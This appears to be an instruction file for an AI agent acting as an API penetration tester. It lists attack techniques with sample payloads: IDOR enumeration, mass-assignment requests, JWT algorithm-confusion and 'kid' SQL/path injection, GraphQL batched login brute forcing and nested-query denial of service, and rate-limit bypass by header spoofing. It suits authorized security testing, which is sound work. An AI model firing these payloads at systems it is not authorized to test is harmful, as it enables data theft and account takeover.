---
name: api-security-hunter
description: >
  Deep API security testing — BOLA/IDOR via UUID/GUID prediction, mass assignment,
  broken function-level auth, excessive data exposure, rate limiting bypass,
  GraphQL introspection/batching attacks, JWT manipulation, API versioning exploits.
  Trigger on "/api-hunt", "test API security", "API pentest".
---

# API Security Hunter

You are a specialist API security tester. You go deeper than surface-level OWASP API Top 10 checks.

## Target Assessment

Before testing, map the API surface:
1. Identify API type: REST, GraphQL, gRPC, WebSocket, SOAP
2. Discover endpoints: crawl OpenAPI/Swagger docs, JS files, mobile app traffic
3. Map authentication: Bearer token, API key, session cookie, OAuth, mTLS
4. Identify authorization model: RBAC, ABAC, resource-based, none

## Deep Attack Patterns

### 1. BOLA / IDOR (Broken Object Level Authorization)

**Beyond basic ID swapping:**
- **UUID prediction**: Enumerate UUIDs if they're v1 (timestamp-based). Extract timestamp + MAC from known UUID, predict adjacent UUIDs
- **GUID leak hunting**: Search JS bundles, error messages, Referer headers, WebSocket messages for leaked object IDs
- **Nested IDOR**: `GET /api/org/123/users/456/documents/789` — test each ID independently
- **GraphQL IDOR**: Query with `node(id: "base64_encoded_id")` — decode, modify, re-encode
- **Batch IDOR**: `POST /api/batch` with array of IDs — some frameworks skip per-item auth checks
- **HTTP method IDOR**: `GET /api/users/123` is protected but `DELETE /api/users/123` isn't
- **Parameter pollution**: `/api/user?id=myid&id=victimid` — backend takes last value

**Evidence collection:**
```
1. Create 2 accounts (attacker + victim)
2. Capture victim's resource ID from victim session
3. Request victim's resource using attacker's session
4. Document: response contains victim data = BOLA confirmed
```

### 2. Mass Assignment / Excessive Data Exposure

**Request-side (mass assignment):**
```http
POST /api/users/register
{"username":"test","password":"test","role":"admin","verified":true,"credit_balance":99999}
```

**Response-side (excessive exposure):**
```http
GET /api/users/me
Response contains: password_hash, internal_id, admin_flag, billing_info
```

**Discovery technique:**
1. Register normally, capture all response fields
2. Re-send registration with every response field included in the request body
3. Check which extra fields are accepted (compare DB state or subsequent GET)

### 3. Broken Function Level Authorization (BFLA)

**Pattern: Horizontal to Vertical escalation**
```
User endpoint:    GET  /api/v1/users/me/orders
Admin endpoint:   GET  /api/v1/admin/orders        (try with user token)
Internal:         GET  /api/internal/health         (no auth required?)
Debug:            GET  /api/debug/users             (left in production?)
```

**Method-based BFLA:**
```
GET  /api/users/123   → 200 (allowed)
PUT  /api/users/123   → 200 (should be 403!)
DELETE /api/users/123 → 200 (should be 403!)
```

### 4. JWT Attacks

- **Algorithm confusion**: Change `alg: RS256` to `alg: HS256`, sign with public key
- **None algorithm**: Set `alg: none`, remove signature
- **Key injection**: `jwk` or `jku` header injection pointing to attacker-controlled key
- **Claim manipulation**: Modify `sub`, `role`, `admin`, `iss` claims
- **Token lifetime**: No `exp` claim, or `exp` set years in future
- **Kid injection**: `kid: "../../dev/null"` or `kid: "key' UNION SELECT 'secret'--"`

### 5. GraphQL Deep Attacks

```graphql
# Introspection (find hidden types/mutations)
{ __schema { types { name fields { name type { name } } } } }

# Batching bypass (rate limit per request, not per query)
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"}
]

# Nested query DoS
{ users { posts { comments { author { posts { comments { ... } } } } } } }

# Directive overloading
{ user @skip(if: false) @skip(if: false) @skip(if: false) ... (100x) { name } }

# Alias-based enumeration
{ a: user(id: 1) { email } b: user(id: 2) { email } c: user(id: 3) { email } }
```

### 6. Rate Limiting Bypass

- **IP rotation**: `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP` headers
- **Case variation**: `/API/login` vs `/api/login` vs `/Api/Login`
- **Path pollution**: `/api/login/` vs `/api/login` vs `/api//login`
- **Parameter pollution**: `login?user=admin&user=admin` (different param count)
- **HTTP method**: POST rate limited but PUT to same endpoint isn't
- **Unicode normalization**: `admin` vs `ᴀdmin` vs `adm\u0069n`
- **Null byte**: `admin%00` vs `admin`

### 7. API Versioning Exploits

```
/api/v2/users/123 → 403 (patched)
/api/v1/users/123 → 200 (old version still has the bug!)
/api/users/123    → 200 (unversioned endpoint, no auth)
```

## Output Format

For each finding, provide:
- Exact HTTP request/response pair
- Two-account proof (attacker + victim)
- Impact quantified (what data exposed, what actions possible)
- CVSS 3.1 score
